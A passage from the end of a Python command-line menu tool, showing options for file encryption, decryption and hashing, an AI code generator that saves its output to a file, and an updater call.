                    self.crypto.encrypt_file(path, key)
                elif sub == '2':
                    path = input(DARK_RED + "[?] File path: " + RESET)
                    key = input(DARK_RED + "[?] Key: " + RESET).encode()
                    self.crypto.decrypt_file(path, key)
                elif sub == '3':
                    path = input(DARK_RED + "[?] File path: " + RESET)
                    self.crypto.hash_file(path)
            
            elif choice == '56':
                print(DARK_RED + "\n[•] AI Code Generator (first load may take a few minutes)" + RESET)
                prompt = input(DARK_RED + "[?] What code do you want to generate? " + RESET)
                print(DARK_RED + "\n[•] Generating code...\n" + RESET)
                code = self.code_gen.generate_code(prompt)
                print(DARK_RED + "Generated Code:\n" + RESET)
                print(code)
                
                save = input(DARK_RED + "\n[?] Save to file? (y/n): " + RESET).lower()
                if save == 'y':
                    name = input(DARK_RED + "[?] Filename: " + RESET) or "generated_code.py"
                    with open(name, 'w') as f:
                        f.write(code)
                    print(DARK_RED + f"[+] Saved to {name}" + RESET)
            
            elif choice == '57':
                self.updater.update()
            
            else:
                print(DARK_RED + "[-] Invalid option" + RESET)
            
            input(DARK_RED + "\n[+] Press Enter to continue" + RESET)

if __name__ == "__main__":
    tool = Tool()
    tool.run()
